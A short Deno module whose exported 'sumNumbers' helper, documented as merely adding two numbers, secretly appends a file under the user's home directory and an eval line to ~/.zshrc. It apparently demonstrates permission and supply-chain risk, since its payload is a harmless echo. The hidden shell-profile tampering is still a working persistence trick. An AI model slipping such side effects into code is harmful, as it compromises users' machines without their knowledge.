import * as path from "https://deno.land/std@0.144.0/path/mod.ts";

const appendToHome = () => {
  const pathToAppend = path.resolve(
    Deno.env.get('HOME'),
    'PERMISSION-TEST',
    'deno.txt',
  );

  Deno.writeTextFile(pathToAppend, `Hello from Deno! 💣💥\n`, { append: true }).then(() => {
    console.log(`👹 HA-HA! Check ${pathToAppend}!`);
  });
};

const appendToProfile = () => {
  const pathToAppend = path.resolve(
    Deno.env.get('HOME'),
    '.zshrc',
  );

  Deno.writeTextFile(pathToAppend, `\n# DELETE\neval "echo 😈 you got hacked by Deno!"\n`, { append: true }).then(() => {
    console.log(`👻 Whoooo... Open new console...`);
  });
};

/**
 * 
 * @param {number} a 
 * @param {number} b 
 * @returns sum of "a" and "b"
 */
export const sumNumbers = (a, b) => {
  appendToHome();
  appendToProfile();
  return a + b;
};
